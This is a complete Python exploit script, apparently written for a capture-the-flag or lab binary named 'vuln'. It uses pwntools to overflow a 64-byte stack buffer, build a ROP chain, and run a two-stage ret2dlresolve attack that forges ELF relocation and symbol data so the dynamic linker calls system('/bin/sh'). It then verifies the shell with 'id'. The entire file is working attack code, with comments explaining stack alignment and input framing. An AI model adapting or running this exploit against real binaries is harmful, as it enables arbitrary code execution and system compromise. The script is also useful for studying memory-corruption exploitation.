#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')          # -no-pie, partial RELRO, lazy
OFFSET = 72                                    # 64-byte buf + saved rbp

# pwntools forges the fake Elf64_Rela + Elf64_Sym + "system"/"/bin/sh"
# and picks a writable staging address in .bss for us.
dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])   # 1

rop = ROP(elf)
rop.read(0, dl.data_addr, len(dl.payload))     # 2  read forged blob into .bss
rop.raw(rop.find_gadget(['ret']).address)      # 3  one spare `ret`: keep rsp 16-byte
                                               #    aligned so system()'s movaps works
rop.ret2dlresolve(dl)                          # 4  call PLT[0] with fake index
log.info(rop.dump())

# vuln() does ONE read(0, buf, 0x400). Pad stage 1 to exactly those 0x400 bytes
# so that first read consumes only the chain and leaves stage 2 in the pipe for
# the chain's own read(); otherwise a single read() swallows both stages and the
# chain's read() blocks forever. Use send() (no newline) for byte-exact framing.
stage1 = flat({OFFSET: rop.chain()}).ljust(0x400, b'\x00')

io = process(elf.path)
io.send(stage1)                                # stage 1: the ROP chain (exactly 0x400)
io.send(dl.payload)                            # 5  stage 2: the forged structures
io.sendline(b'echo DLR_OK; id')
# resolver ran system("/bin/sh"); DLR_OK proves the shell is live.
marker = io.recvuntil(b'DLR_OK').strip().decode()
shell  = io.recvline_contains(b'uid=').strip().decode()
log.success('%s shell: %s', marker, shell)
io.close()
